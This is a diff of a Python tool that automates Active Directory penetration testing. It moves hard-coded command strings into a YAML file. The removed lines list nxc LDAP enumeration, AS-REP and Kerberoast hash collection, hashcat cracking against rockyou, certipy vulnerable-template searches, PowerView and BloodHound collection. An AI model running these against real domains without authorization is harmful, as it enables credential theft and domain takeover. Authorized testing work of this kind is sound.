@@ -205,128 +205,25 @@ def build_ldap_commands(
     PowerView anon (pane 2).
 
     Returns an empty list when neither creds nor anon_bind are available.
+
+    Command text lives in tasks.yaml (``ldap``).  This function keeps the
+    logic: cred takes precedence over anon_bind, and the faketime prefix is
+    supplied as the {{ft}} placeholder.
     """
-    ft = faketime_prefix(ip)
+    spec = load_spec()["ldap"]
+    params: dict = {
+        "ip": ip,
+        "domain": domain,
+        "dc_fqdn": dc_fqdn,
+        "ft": faketime_prefix(ip),
+    }
 
     if cred:
-        user, password = cred
-
-        pane1 = Command(
-            args=[
-                f"{ft}bloodyAD --host {dc_fqdn} -d {domain}"
-                f" -u '{user}' -p '{password}' -k get writable",
-                "echo",
-                "rm -f $(pwd)/hashes.kerberoast",
-                (
-                    f"{ft}nxc ldap {ip} -u '{user}' -p '{password}' -k"
-                    f" --pass-pol --pso"
-                    f" --asreproast hashes.asreproast"
-                    f" --kerberoasting hashes.kerberoast"
-                    f" --find-delegation --trusted-for-delegation"
-                    f" --password-not-required --users --groups --dc-list --gmsa"
-                ),
-                (
-                    f"{ft}nxc ldap {ip} -u '{user}' -p '{password}' -k"
-                    f" -M maq -M sccm -M laps -M adcs -M pre2k"
-                    f" -M badsuccessor -M dns-nonsecure -M dump-computers"
-                    f" -M get-network -M obsolete"
-                ),
-                "echo",
-                (
-                    "hashcat -m 18200 hashes.asreproast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-                (
-                    "hashcat -m 13100 hashes.kerberoast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-                (
-                    "hashcat -m 19700 hashes.kerberoast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-            ],
-            description="LDAP AD enumeration (auth)",
-            delay=7,
-        )
-
-        pane2 = Command(
-            args=[
-                "rm -f $(pwd)/initial_enabled_Certipy.json",
-                (
-                    f"{ft}certipy find -u '{user}'@{domain} -p '{password}' -k"
-                    f" -target {dc_fqdn} -dc-ip {ip}"
-                    f" -stdout -json -output initial_enabled -timeout 2 -enabled"
-                ),
-                r"echo -e '\n<--- Find Vulnerable: --->\n'",
-                (
-                    f"{ft}certipy find -u '{user}'@{domain} -p '{password}' -k"
-                    f" -target {dc_fqdn} -dc-ip {ip}"
-                    f" -stdout -timeout 2 -vulnerable"
-                ),
-                "echo",
-                "parse_certipy.py initial_enabled_Certipy.json",
-                "echo",
-                (
-                    f"{ft}powerview {domain}/'{user}':'{password}'"
-                    f"@{dc_fqdn} -k --web --no-cache"
-                ),
-            ],
-            description="Certificate enumeration (auth)",
-            delay=7,
-        )
-
-        pane3 = Command(
-            args=[
-                "bloodhound-cli up",
-                "sleep 1",
-                "echo",
-                (
-                    f"{ft}bloodhound-ce-python --zip -c All -d {domain}"
-                    f" -dc {dc_fqdn} -ns {ip} -u '{user}' -p '{password}' -op ia"
-                    f" && bloodhound-ce-ctl -u http://127.0.0.1:8081"
-                    f" -c -p -z $(ls -t ia_*_bloodhound.zip | head -n1)"
-                ),
-            ],
-            description="Start BloodHound",
-            delay=2,
-        )
-
-        return [pane1, pane2, pane3]
+        params["user"], params["password"] = cred
+        return render_panes(spec["variants"]["auth"], params)
 
     if anon_bind:
-        pane1 = Command(
-            args=[
-                "rm -f $(pwd)/hashes.kerberoast",
-                (
-                    f"nxc ldap {dc_fqdn} -u '' -p ''"
-                    f" --asreproast hashes.asreproast"
-                    f" --kerberoasting hashes.kerberoast"
-                    f" --find-delegation --trusted-for-delegation"
-                    f" --password-not-required --users --groups --dc-list --gmsa"
-                ),
-                "echo",
-                (
-                    "hashcat -m 18200 hashes.asreproast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-                (
-                    "hashcat -m 13100 hashes.kerberoast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-                (
-                    "hashcat -m 19700 hashes.kerberoast"
-                    " /usr/share/wordlists/rockyou.txt --force --quiet"
-                ),
-            ],
-            description="LDAP anonymous enumeration",
-            delay=7,
-        )
-        pane2 = Command(
-            args=[f"powerview {dc_fqdn} --no-cache"],
-            description="PowerView anonymous",
-            delay=2,
-        )
-        return [pane1, pane2]
+        return render_panes(spec["variants"]["anon"], params)
 
     return []
 
